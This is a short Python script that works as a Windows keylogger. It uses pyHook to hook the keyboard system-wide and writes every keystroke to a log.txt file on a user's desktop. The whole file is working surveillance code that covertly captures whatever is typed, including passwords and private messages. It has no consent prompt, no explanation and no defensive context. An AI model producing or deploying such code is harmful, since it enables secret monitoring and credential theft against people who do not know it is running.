import pyHook
import pythoncom
import sys
import logging

file_log = 'C:\\Users\\Iqan\\Desktop\\log.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hook_manager = pyHook.HookManager()
hook_manager.KeyDown = OnKeyboardEvent
hook_manager.HookKeyboard()
pythoncom.PumpMessages()
